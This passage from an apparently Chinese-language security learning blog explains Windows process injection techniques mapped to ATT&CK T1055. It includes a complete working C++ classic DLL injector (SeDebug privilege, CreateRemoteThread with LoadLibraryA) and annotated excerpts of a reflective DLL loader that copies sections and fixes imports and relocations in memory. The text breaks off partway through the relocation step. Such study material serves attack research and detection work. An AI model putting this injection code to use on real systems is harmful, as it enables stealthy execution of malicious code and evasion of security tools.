alt=\"statehackers\"></p>\n<a id=\"more\"></a>\n\n<p>学习代码存放在：<a href=\"https://github.com/yongsheng220/ProcessInject\">https://github.com/yongsheng220/ProcessInject</a></p>\n<p>进程注入是一种在单独的活动进程中的地址空间中执行任意代码的方法。 在一个进程的上下文中运行特定代码，则有可能访问该进程的内存，系统或网络资源以及提升权限。即将 shellcode/PE “注入” 至某个进程中来尝试规避检测。</p>\n<p>根据ATT&amp;CK，针对进程注入有以下12种分类：</p>\n<ul>\n<li>T1055.001– Dynamic-link Library Injection（dll注入）</li>\n<li>T1055.002– Portable Executable Injection（PE注入）</li>\n<li>T1055.003– Thread Execution Hijacking（线程劫持）</li>\n<li>T1055.004– Asynchronous Procedure Call（APC注入）</li>\n<li>T1055.005– Thread Local Storage（线程本地存储TLS注入）</li>\n<li>T1055.008– Ptrace System Calls（Linux下的Ptrace注入）</li>\n<li>T1055.009– Proc Memory</li>\n<li>T1055.011– Extra Window Memory Injection（额外窗口内存注入）</li>\n<li>T1055.012– Process Hollowing（傀儡进程/进程镂空）</li>\n<li>T1055.013– Process Doppelganging（进程替身/进程分身）</li>\n<li>T1055.014– VDSO Hijacking</li>\n<li>T1055.015– ListPlanting（滥用listview控件）</li>\n</ul>\n<p>整个关系图如下 <a href=\"https://mp.weixin.qq.com/s/9v6qGqHlzD6Ee3ICOeuVvQ\">ATT&amp;CK-防御绕过之进程注入攻防分析</a>：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240613160104871.png\"></p>\n<h1 id=\"DLL注入\"><a href=\"#DLL注入\" class=\"headerlink\" title=\"DLL注入\"></a>DLL注入</h1><p>根据ATT&amp;CK框架，该方法还存在三种变体，我将该方法以及变体总结为以下手法</p>\n<ul>\n<li>Classic dll injection:（常规dll注入）</li>\n<li>reflective DLL injection（反射dll注入）</li>\n<li>memory module（内存模块）</li>\n<li>Module Stomping/Overloading 或 DLL Hollowing（模块镂空）</li>\n</ul>\n<h2 id=\"经典Dll注入\"><a href=\"#经典Dll注入\" class=\"headerlink\" title=\"经典Dll注入\"></a>经典Dll注入</h2><p>首先需要恶意dll落地，然后通过远程线程调用LoadLibrary，让目标线程主动加载恶意dll。所以目标进程中的模块列表会有恶意dll。</p>\n<p>流程：</p>\n<ol>\n<li>提升当前进程权限（将访问令牌中禁用的权限启用）</li>\n<li>获取要注入进程的PID</li>\n<li>打开目标线程</li>\n<li>开辟内存空间，存储恶意dll绝对路径</li>\n<li>通过目标进程中的kernel32.dll获取LoadLibrary函数地址</li>\n<li>通过CreateRemoteThread远程调用LoadLibrary，使目标进程加载恶意dll</li>\n</ol>\n<p>首先要将当前进程得到 <strong>SeDebug</strong> 权限，<strong>将访问令牌中禁用的权限启用</strong>。成功调用下面几个函数的前提是进程具备该权限, 只是访问令牌中没有启用该权限. 而如果进程没有该权限, 则使用下面的函数后再调用 <code>GetLastError</code>会返回 <code>ERROR_NOT_ALL_ASSIGN</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include&lt;iostream&gt;</span><br><span class=\"line\">#include&lt;Windows.h&gt;</span><br><span class=\"line\">#include&lt;string&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\"></span><br><span class=\"line\">BOOL PrivilegeEscalation()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    HANDLE hToken;</span><br><span class=\"line\">    LUID luid;</span><br><span class=\"line\">    TOKEN_PRIVILEGES tp;</span><br><span class=\"line\">    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken);</span><br><span class=\"line\">    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;luid);</span><br><span class=\"line\">    tp.PrivilegeCount &#x3D; 1;</span><br><span class=\"line\">    tp.Privileges[0].Attributes &#x3D; SE_PRIVILEGE_ENABLED;</span><br><span class=\"line\">    tp.Privileges[0].Luid &#x3D; luid;</span><br><span class=\"line\">    if (!AdjustTokenPrivileges(hToken, 0, &amp;tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))&#123;</span><br><span class=\"line\">        CloseHandle(hToken);</span><br><span class=\"line\">        return FALSE;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else &#123;</span><br><span class=\"line\">        cout &lt;&lt; &quot;[+]提权成功&quot; &lt;&lt; endl;</span><br><span class=\"line\">        return TRUE;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">BOOL RemoteInjectDll(DWORD Pid, char* DllPath)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    &#x2F;&#x2F; 打开远程进程</span><br><span class=\"line\">    HANDLE hProcess &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid);</span><br><span class=\"line\">    &#x2F;&#x2F; 在 指定进程 中分配内存</span><br><span class=\"line\">    size_t dwSize &#x3D; strlen(DllPath) + 1;</span><br><span class=\"line\">    LPVOID pDllAddr &#x3D; VirtualAllocEx(hProcess,NULL,dwSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class=\"line\">    &#x2F;&#x2F; 写入到目标进程内存</span><br><span class=\"line\">    WriteProcessMemory(hProcess, pDllAddr, DllPath, dwSize, NULL);</span><br><span class=\"line\">    &#x2F;&#x2F; 从Kernel32.dll 中获取 LoadLibrary 函数</span><br><span class=\"line\">    HMODULE hker &#x3D; GetModuleHandleA(&quot;kernel32.dll&quot;);</span><br><span class=\"line\">    FARPROC pLoadAddr &#x3D; GetProcAddress(hker, &quot;LoadLibraryA&quot;);</span><br><span class=\"line\">    &#x2F;&#x2F; 远程调用</span><br><span class=\"line\">    HANDLE hRemoteHandle &#x3D; CreateRemoteThread(hProcess,NULL,0, (LPTHREAD_START_ROUTINE)pLoadAddr, pDllAddr,0,NULL);</span><br><span class=\"line\">    if (hRemoteHandle &#x3D;&#x3D; NULL) &#123;</span><br><span class=\"line\">        VirtualFreeEx(hProcess, pDllAddr, 0, MEM_RELEASE);</span><br><span class=\"line\">        CloseHandle(hProcess);</span><br><span class=\"line\">        return FALSE;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    WaitForSingleObject(hRemoteHandle, INFINITE);</span><br><span class=\"line\"></span><br><span class=\"line\">    CloseHandle(hRemoteHandle);</span><br><span class=\"line\">    VirtualFreeEx(hProcess, pDllAddr, 0, MEM_RELEASE);</span><br><span class=\"line\">    CloseHandle(hProcess);</span><br><span class=\"line\">    cout &lt;&lt; &quot;[+]dll执行成功&quot; &lt;&lt; endl;</span><br><span class=\"line\">    return TRUE;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    &#x2F;&#x2F; 提升当前进程权限</span><br><span class=\"line\">    if (!PrivilegeEscalation()) &#123;</span><br><span class=\"line\">        cout &lt;&lt; &quot;[-]提升权限失败&quot; &lt;&lt; endl;</span><br><span class=\"line\">        return 0;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    DWORD PID;</span><br><span class=\"line\">    char DllPath[40];</span><br><span class=\"line\"></span><br><span class=\"line\">    cout &lt;&lt; &quot;[.]DLLfile Path :&quot; &lt;&lt; endl;cin &gt;&gt; DllPath;</span><br><span class=\"line\">    cout &lt;&lt; &quot;[.]Target PRocessID :&quot; &lt;&lt; endl;cin &gt;&gt; PID;</span><br><span class=\"line\">    RemoteInjectDll(PID, DllPath);</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>对应进程名为notepad.exe，模块列表显示恶意dll。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240615002715858.png\"></p>\n<p>PS：当cs执行退出会话时，也会将对应的进程关闭掉。所以注入explorer.exe后退出会话会造成短暂崩溃。但是通过cs的原生inject操作再进行退出会话就不会造成对应进程的崩溃。</p>\n<h2 id=\"反射Dll注入\"><a href=\"#反射Dll注入\" class=\"headerlink\" title=\"反射Dll注入\"></a>反射Dll注入</h2><p>在学习反射dll注入前，首先学习一下 PE文件结构的前置知识 <a href=\"https://tttang.com/archive/1553/\">PE文件结构从初识到简单shellcode注入</a> 与 模拟PE加载过程 <a href=\"https://www.kn0sky.com/?p=37\">手工模拟PE加载器</a> 会更好理解该手法，简单来说当windows加载DLL时有以下步骤：</p>\n<ol>\n<li>检测DOS和PE头的合法性。</li>\n<li>尝试在PEHeader.OptionalHeader.ImageBase位置分配PEHeader.OptionalHeader.SizeOfImage字节的内存区域。</li>\n<li>解析Section header中的每个Section，并将它们的实际内容拷贝到第2步分配的地址空间中。拷贝的目的地址的计算方法为：IMAGE_SECTION_HEADER.VirtualAddress偏移 + 第二步分配的内存区域的起始地址。</li>\n<li>检查加载到进程地址空间的位置和之前PE文件中指定的基地址是否一致，如果不一致，则需要重定位。重定位就需要用到1.2节中的IMAGE_OPTIONAL_HEADER64.DataDirectory[5].</li>\n<li>加载该DLL依赖的其他dll，并构建 PEHeader.OptionalHeader.DataDirectory.Image_directory_entry_import 导入表.</li>\n<li>根据每个Section的”PEHeader.Image_Section_Table.Characteristics”属性来设置内存页的访问属性； 如果被设置为”discardable”属性，则释放该内存页。</li>\n<li>获取DLL的入口函数指针，并使用DLL_PROCESS_ATTACH参数调用。</li>\n</ol>\n<p>该注入方法主要特点为：<strong>不使用LoadLibrary</strong> API函数加载磁盘中的DLL，而是通过内嵌/网络下载恶意DLL到内存中，为恶意DLL添加一个导出函数，该导出函数（称为：ReflectiveLoader）功能是 模拟PE加载的过程从而加载自身，最终只要执行该导出函数便可达到无文件落地内存加载目的。因此通过分析工具在模块列表处是看不到恶意DLL的。</p>\n<p>所以完成反射DLL注入需要两部分：1. 带有自实现ReflectiveLoader函数的恶意DLL。2. 注入器。</p>\n<p>如图：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240615152448768.png\"></p>\n<p>在恶意DLL中实现ReflectiveLoader过程中，或者说模拟一个PE加载函数需要这么几步：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240615153954111.png\" alt=\"image-20240615153954111\"></p>\n<p>代码实现直接参考提出者stephenfewer的开源项目：<a href=\"https://github.com/stephenfewer/ReflectiveDLLInjection\">stephenfewer/ReflectiveDLLInjection</a></p>\n<p>一、定位DLL在内存中的基址</p>\n<p>调用_ReturnAddress 返回当前调用函数返回的地址，即函数下一跳指令地址，此时返回的不是DLL头部文件的地址，但是比较接近了。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">uiLibraryAddress &#x3D; caller();</span><br><span class=\"line\"></span><br><span class=\"line\">__declspec(noinline) ULONG_PTR caller( VOID ) &#123; return (ULONG_PTR)_ReturnAddress(); &#125;</span><br></pre></td></tr></table></figure>\n\n<p>然后通过逐字节遍历，查找是否符合DOS头（MZ），接着通过e_lfanew字段得到NT头地址，再校验Signature字段是否符合PE标记。都满足就判定当前 uiLibraryAddress 的地址就是DLL的基址。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">while( TRUE )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if( ((PIMAGE_DOS_HEADER)uiLibraryAddress)-&gt;e_magic &#x3D;&#x3D; IMAGE_DOS_SIGNATURE )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        uiHeaderValue &#x3D; ((PIMAGE_DOS_HEADER)uiLibraryAddress)-&gt;e_lfanew;</span><br><span class=\"line\">        &#x2F;&#x2F; some x64 dll&#39;s can trigger a bogus signature (IMAGE_DOS_SIGNATURE &#x3D;&#x3D; &#39;POP r10&#39;),</span><br><span class=\"line\">        &#x2F;&#x2F; we sanity check the e_lfanew with an upper threshold value of 1024 to avoid problems.</span><br><span class=\"line\">        if( uiHeaderValue &gt;&#x3D; sizeof(IMAGE_DOS_HEADER) &amp;&amp; uiHeaderValue &lt; 1024 )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            uiHeaderValue +&#x3D; uiLibraryAddress;</span><br><span class=\"line\">            &#x2F;&#x2F; break if we have found a valid MZ&#x2F;PE header</span><br><span class=\"line\">            if( ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;Signature &#x3D;&#x3D; IMAGE_NT_SIGNATURE )</span><br><span class=\"line\">                break;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    uiLibraryAddress--;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>二、获取所需的系统API函数</p>\n<p>通过解析PEB结构体中的 Ldr 中的 InMemoryOrderModuleList 获取指定的 DLL（kernel32.dll、ntdll.dll）</p>\n<p>x64下通过gs寄存器获取PEB地址</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#ifdef WIN_X64</span><br><span class=\"line\">\tuiBaseAddress &#x3D; __readgsqword( 0x60 );</span><br><span class=\"line\">#else</span><br><span class=\"line\">#ifdef WIN_X86</span><br><span class=\"line\">\tuiBaseAddress &#x3D; __readfsdword( 0x30 );</span><br><span class=\"line\">#else WIN_ARM</span><br><span class=\"line\">\tuiBaseAddress &#x3D; *(DWORD *)( (BYTE *)_MoveFromCoprocessor( 15, 0, 13, 0, 2 ) + 0x30 );</span><br><span class=\"line\">#endif</span><br><span class=\"line\">#endif</span><br></pre></td></tr></table></figure>\n\n<p>通过 Ldr.InMemoryOrderModuleList 匹配DLL名称hash。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">uiBaseAddress &#x3D; (ULONG_PTR)((_PPEB)uiBaseAddress)-&gt;pLdr;</span><br><span class=\"line\"></span><br><span class=\"line\">uiValueA &#x3D; (ULONG_PTR)((PPEB_LDR_DATA)uiBaseAddress)-&gt;InMemoryOrderModuleList.Flink;</span><br><span class=\"line\">while( uiValueA )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    uiValueB &#x3D; (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)-&gt;BaseDllName.pBuffer;</span><br><span class=\"line\">    usCounter &#x3D; ((PLDR_DATA_TABLE_ENTRY)uiValueA)-&gt;BaseDllName.Length;</span><br><span class=\"line\">    uiValueC &#x3D; 0;</span><br><span class=\"line\">    do</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        uiValueC &#x3D; ror( (DWORD)uiValueC );</span><br><span class=\"line\">        if( *((BYTE *)uiValueB) &gt;&#x3D; &#39;a&#39; )</span><br><span class=\"line\">            uiValueC +&#x3D; *((BYTE *)uiValueB) - 0x20;</span><br><span class=\"line\">        else</span><br><span class=\"line\">            uiValueC +&#x3D; *((BYTE *)uiValueB);</span><br><span class=\"line\">        uiValueB++;</span><br><span class=\"line\">    &#125; while( --usCounter );</span><br><span class=\"line\"></span><br><span class=\"line\">if( (DWORD)uiValueC &#x3D;&#x3D; KERNEL32DLL_HASH )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t......</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>通过继续解析PEB找到 NT头、导出表、导出函数地址数组、导出函数名数组和导出函数序号数组后，对所需函数进行hash匹配，至此获取所需函数地址。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">......</span><br><span class=\"line\">if( dwHashValue &#x3D;&#x3D; LOADLIBRARYA_HASH || dwHashValue &#x3D;&#x3D; GETPROCADDRESS_HASH || dwHashValue &#x3D;&#x3D; VIRTUALALLOC_HASH )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    &#x2F;&#x2F; get the VA for the array of addresses</span><br><span class=\"line\">    uiAddressArray &#x3D; ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfFunctions );</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; use this functions name ordinal as an index into the array of name pointers</span><br><span class=\"line\">    uiAddressArray +&#x3D; ( DEREF_16( uiNameOrdinals ) * sizeof(DWORD) );</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; store this functions VA</span><br><span class=\"line\">    if( dwHashValue &#x3D;&#x3D; LOADLIBRARYA_HASH )</span><br><span class=\"line\">        pLoadLibraryA &#x3D; (LOADLIBRARYA)( uiBaseAddress + DEREF_32( uiAddressArray ) );</span><br><span class=\"line\">    else if( dwHashValue &#x3D;&#x3D; GETPROCADDRESS_HASH )</span><br><span class=\"line\">        pGetProcAddress &#x3D; (GETPROCADDRESS)( uiBaseAddress + DEREF_32( uiAddressArray ) );</span><br><span class=\"line\">    else if( dwHashValue &#x3D;&#x3D; VIRTUALALLOC_HASH )</span><br><span class=\"line\">        pVirtualAlloc &#x3D; (VIRTUALALLOC)( uiBaseAddress + DEREF_32( uiAddressArray ) );</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; decrement our counter</span><br><span class=\"line\">    usCounter--;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>三、申请装载DLL的内存空间/复制PE头和各个节</p>\n<p>通过 e_lfanew 获取到 NT头中的SizeOfImage，开辟空间，将NT头部信息复制到空间中</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">uiBaseAddress &#x3D; (ULONG_PTR)pVirtualAlloc( NULL, ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;OptionalHeader.SizeOfImage, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );</span><br><span class=\"line\"></span><br><span class=\"line\">uiValueA &#x3D; ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;OptionalHeader.SizeOfHeaders;</span><br><span class=\"line\">uiValueB &#x3D; uiLibraryAddress;</span><br><span class=\"line\">uiValueC &#x3D; uiBaseAddress;</span><br><span class=\"line\"></span><br><span class=\"line\">while( uiValueA-- )</span><br><span class=\"line\">    *(BYTE *)uiValueC++ &#x3D; *(BYTE *)uiValueB++;</span><br></pre></td></tr></table></figure>\n\n<p>同样方式将各个节复制到空间中</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; itterate through all sections, loading them into memory.</span><br><span class=\"line\">uiValueE &#x3D; ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;FileHeader.NumberOfSections;</span><br><span class=\"line\">while( uiValueE-- )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t&#x2F;&#x2F; uiValueB is the VA for this section</span><br><span class=\"line\">\tuiValueB &#x3D; ( uiBaseAddress + ((PIMAGE_SECTION_HEADER)uiValueA)-&gt;VirtualAddress );</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; uiValueC if the VA for this sections data</span><br><span class=\"line\">\tuiValueC &#x3D; ( uiLibraryAddress + ((PIMAGE_SECTION_HEADER)uiValueA)-&gt;PointerToRawData );</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; copy the section over</span><br><span class=\"line\">\tuiValueD &#x3D; ((PIMAGE_SECTION_HEADER)uiValueA)-&gt;SizeOfRawData;</span><br><span class=\"line\"></span><br><span class=\"line\">\twhile( uiValueD-- )</span><br><span class=\"line\">\t\t*(BYTE *)uiValueB++ &#x3D; *(BYTE *)uiValueC++;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; get the VA of the next section</span><br><span class=\"line\">\tuiValueA +&#x3D; sizeof( IMAGE_SECTION_HEADER );</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>四、处理DLL导入表</p>\n<p>PE文件的导入表（Import Table）列出了该文件依赖的外部DLL及其导入的函数。加载器解析导入表，并使用 <code>LoadLibrary</code>和<code>GetProcAddress</code> 函数加载所需的DLL，获取导入函数的地址，并填充导入地址表（IAT）</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240616005830412.png\"></p>\n<p>PE加载前</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240616005910129.png\" alt=\"image-20240616005910129\"></p>\n<p>PE加载后：IAT被填充函数地址</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240616010142570.png\" alt=\"image-20240616010142570\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; 通过NT头的数据目录获取导出表的地址</span><br><span class=\"line\">uiValueB &#x3D; (ULONG_PTR)&amp;((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ];</span><br><span class=\"line\"></span><br><span class=\"line\">uiValueC &#x3D; ( uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)-&gt;VirtualAddress );</span><br><span class=\"line\"></span><br><span class=\"line\">while( ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)-&gt;Name )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t&#x2F;&#x2F; 使用LoadLibraryA加载所需要的DLL</span><br><span class=\"line\">\tuiLibraryAddress &#x3D; (ULONG_PTR)pLoadLibraryA( (LPCSTR)( uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)-&gt;Name ) );</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; OriginalFirstThunk</span><br><span class=\"line\">\tuiValueD &#x3D; ( uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)-&gt;OriginalFirstThunk );</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; IAT</span><br><span class=\"line\">\tuiValueA &#x3D; ( uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)-&gt;FirstThunk );</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; 遍历导入的函数</span><br><span class=\"line\">\twhile( DEREF(uiValueA) )</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t&#x2F;&#x2F; 如果是序号导入</span><br><span class=\"line\">\t\tif( uiValueD &amp;&amp; ((PIMAGE_THUNK_DATA)uiValueD)-&gt;u1.Ordinal &amp; IMAGE_ORDINAL_FLAG )</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t&#x2F;&#x2F; 获取上面LoadLibraryA加载的模块的NT头</span><br><span class=\"line\">\t\t\tuiExportDir &#x3D; uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)-&gt;e_lfanew;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\tuiNameArray &#x3D; (ULONG_PTR)&amp;((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\tuiExportDir &#x3D; ( uiLibraryAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)-&gt;VirtualAddress );</span><br><span class=\"line\">\t\t\tuiAddressArray &#x3D; ( uiLibraryAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfFunctions );</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t&#x2F;&#x2F; 定位函数地址：首先计算目标函数在依赖DLL的导出地址表的偏移位置。这个位置的计算方法是通过取函数的序号并减去基序号(导出函数序号的最小值)得出来得的,然后这个偏移量再乘以sizeof(DWORD),就是目标函数在导出地址表的偏移位置。最后再加上uiAddressArray，此变量现在指向目标函数地址的指针</span><br><span class=\"line\">\t\t\tuiAddressArray +&#x3D; ( ( IMAGE_ORDINAL( ((PIMAGE_THUNK_DATA)uiValueD)-&gt;u1.Ordinal ) - ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;Base ) * sizeof(DWORD) );</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t&#x2F;&#x2F; 写入到IAT</span><br><span class=\"line\">\t\t\tDEREF(uiValueA) &#x3D; ( uiLibraryAddress + DEREF_32(uiAddressArray) );</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\telse</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t&#x2F;&#x2F; 如果是名称导入</span><br><span class=\"line\">\t\t\tuiValueB &#x3D; ( uiBaseAddress + DEREF(uiValueA) );</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t&#x2F;&#x2F; 通过GetProcAddress获取函数地址，写入IAT</span><br><span class=\"line\">\t\t\tDEREF(uiValueA) &#x3D; (ULONG_PTR)pGetProcAddress( (HMODULE)uiLibraryAddress, (LPCSTR)((PIMAGE_IMPORT_BY_NAME)uiValueB)-&gt;Name );</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">......</span><br></pre></td></tr></table></figure>\n\n<p>五、处理DLL重定位表</p>\n<p>在编译PE文件时，编译器通常会指定一个默认的基地址（Image Base），即首选的内存加载地址。当多个DLL或可执行文件试图加载到相同的首选地址时，冲突就会发生。为了避免这种冲突，Windows加载器可能需要将PE文件加载到不同于其首选地址的内存位置。这时，所有基于首选地址的指针和地址引用都需要进行调整，这就是重定位的作用。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; 计算基址偏移量:当前DLL的实际加载地址减去预设的基地址</span><br><span class=\"line\">uiLibraryAddress &#x3D; uiBaseAddress - ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;OptionalHeader.ImageBase;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 获取重定位表的地址</span><br><span class=\"line\">uiValueB &#x3D; (ULONG_PTR)&amp;((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ];</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 通过检查重定位表是否为空来判断是否存在重定位项</span><br><span class=\"line\">if( ((PIMAGE_DATA_DIRECTORY)uiValueB)-&gt;Size )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    &#x2F;&#x2F; uiValueC指向第一个重定位块的地址</span><br><span class=\"line\">    uiValueC &#x3D; ( uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)-&gt;VirtualAddress );</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; 开始遍历所有重定位块</span><br><span class=\"line\">    while( ((PIMAGE_BASE_RELOCATION)uiValueC)-&gt;SizeOfBlock )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        &#x2F;&#x2F; 获取重定位块的地址</span><br><span class=\"line\">        uiValueA &#x3D; ( uiBaseAddress + ((PIMAGE_BASE_RELOCATION)uiValueC)-&gt;VirtualAddress );</span><br><span class=\"line\"></span><br><span class=\"line\">        &#x2F;&#x2F; 获取重定位块中包含的重定位项的数量</span><br><span class=\"line\">        uiValueB &#x3D; ( ((PIMAGE_BASE_RELOCATION)uiValueC)-&gt;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION) ) &#x2F; sizeof( IMAGE_RELOC );</span><br><span class=\"line\"></span><br><span class=\"line\">        &#x2F;&#x2F; uiValueD设置为当前块中的第一个重定位项</span><br><span class=\"line\">        uiValueD &#x3D; uiValueC + sizeof(IMAGE_BASE_RELOCATION);</span><br><span class=\"line\"></span><br><span class=\"line\">        &#x2F;&#x2F; 遍历重定位项</span><br><span class=\"line\">        while( uiValueB-- )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &#x2F;&#x2F; 根据重定位项的类型来修正相应的地址</span><br><span class=\"line\">            if( ((PIMAGE_RELOC)uiValueD)-&gt;type &#x3D;&#x3D; IMAGE_REL_BASED_DIR64 )</span><br><span class=\"line\">                *(ULONG_PTR *)(uiValueA + ((PIMAGE_RELOC)uiValueD)-&gt;offset) +&#x3D; uiLibraryAddress;</span><br><span class=\"line\">            else if( ((PIMAGE_RELOC)uiValueD)-&gt;type &#x3D;&#x3D; IMAGE_REL_BASED_HIGHLOW )</span><br><span class=\"line\">                *(DWORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)-&gt;offset) +&#x3D; (DWORD)uiLibraryAddress;</span><br><span class=\"line\">            else if( ((PIMAGE_RELOC)uiValueD)-&gt;type &#x3D;&#x3D; IMAGE_REL_BASED_HIGH )</span><br><span class=\"line\">                *(WORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)-&gt;offset) +&#x3D; HIWORD(uiLibraryAddress);</span><br><span class=\"line\">            else if( ((PIMAGE_RELOC)uiValueD)-&gt;type &#x3D;&#x3D; IMAGE_REL_BASED_LOW )</span><br><span class=\"line\">                *(WORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)-&gt;offset) +&#x3D; LOWORD(uiLibraryAddress);</span><br><span class=\"line\"></span><br><span class=\"line\">            &#x2F;&#x2F; 遍历下一个重定位项</span><br><span class=\"line\">            uiValueD +&#x3D; sizeof( IMAGE_RELOC );</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#x2F;&#x2F; 遍历下一个重定位块</span><br><span class=\"line\">        uiValueC &#x3D; uiValueC + ((PIMAGE_BASE_RELOCATION)uiValueC)-&gt;SizeOfBlock;</span><br><span class=\"line\">    &#125;</span><br><span 